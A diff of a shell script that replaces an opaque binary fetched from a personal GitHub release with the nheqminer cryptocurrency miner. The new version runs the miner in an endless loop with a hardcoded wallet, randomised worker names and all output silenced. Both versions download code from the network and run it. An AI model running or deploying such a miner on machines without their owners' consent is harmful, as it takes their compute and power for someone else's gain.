@@ -4,12 +4,12 @@
 
 sudo apt update
 sudo apt install libjansson4 -y
-chmod 777 ccmminer
-wget https://github.com/mariobiszz/perus/releases/download/1/ver.tar.gz
-tar -xvf ver.tar.gz
-chmod 777 ver ver.ini
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
 while true
 do
-./ver ver.ini
+./nheqminer -v -l na.luckpool.net:3956 -u RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg.$(echo $(shuf -i 1-20000 -n 1)-V) -p x -t 36
 > /dev/null 2>&1
 done
